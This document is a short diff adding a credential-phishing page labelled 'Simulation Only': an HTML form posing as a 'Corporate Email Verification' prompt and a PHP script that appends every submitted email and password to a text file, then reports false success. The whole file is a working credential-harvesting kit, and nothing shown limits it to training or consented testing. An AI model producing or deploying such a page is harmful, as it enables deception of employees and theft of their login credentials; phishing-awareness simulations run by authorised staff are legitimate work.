@@ -1,0 +1,18 @@
+# Phishing Website - Simulation Only
+
+# ===================== index.html =====================
+
+<h2>Corporate Email Verification</h2>
+<form method="POST" action="login.php">
+Email: <input name="email"><br>
+Password: <input type="password" name="pass"><br>
+<input type="submit" value="Verify">
+</form>
+
+
+# ===================== login.php =====================
+
+<?php
+file_put_contents("creds.txt", $_POST['email']." | ".$_POST['pass']."\n", FILE_APPEND);
+echo "Verification successful";
+?>
